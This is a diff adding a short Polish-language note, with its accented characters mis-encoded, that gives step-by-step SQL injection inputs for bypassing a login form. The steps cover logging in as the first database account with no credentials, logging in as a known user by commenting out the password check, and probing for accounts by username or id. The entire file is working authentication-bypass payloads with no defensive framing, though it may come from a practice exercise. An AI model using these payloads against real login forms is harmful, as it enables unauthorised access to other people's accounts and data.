@@ -1,0 +1,18 @@
+1. Logujemy siê na pierwsze konto w DB (nie trzeba znaæ ani loginu ani has³a)
+Login: [dowolny ci¹g znaków]
+Password: [' OR 1=1 -- ]
+
+
+2. Logujemy siê na konto w bazie do którego znamy login:
+Login: [user' -- ]
+Password: [dowolny ci¹g znaków]
+
+
+3. Nie znamy u¿ytkownika ale mo¿emy szukaæ metod¹ prób i b³êdów w bazie np nazwa u¿ytkownika:
+Login: [' OR user='daria' -- ]
+Password: [dowolny ci¹g znaków]
+
+
+4. Nie znamy u¿ytkownika ale mo¿emy szukaæ metod¹ prób i b³êdów w bazie np numer id w bazie:
+Login: [' OR id=0 -- ]
+Password: [dowolny ci¹g znaków]
